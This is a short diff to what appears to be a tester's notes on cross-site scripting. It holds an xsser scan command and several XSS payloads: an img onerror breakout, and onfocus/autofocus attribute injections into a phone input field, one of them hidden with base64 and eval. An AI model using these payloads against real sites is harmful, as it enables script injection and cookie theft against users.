@@ -4,3 +4,13 @@ xsser -u https://example.com -c 20 --Cl
 "><img src=x onerror=alert(document.cookie)>
 javascript:alert()
 
+
+код страницы
+<td><input type="text" name="phone" value="xsssssss"></td>
+payload 
+" onfocus=alert(document.cookie) autofocus=">
+" onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus=">
+
+
+
+
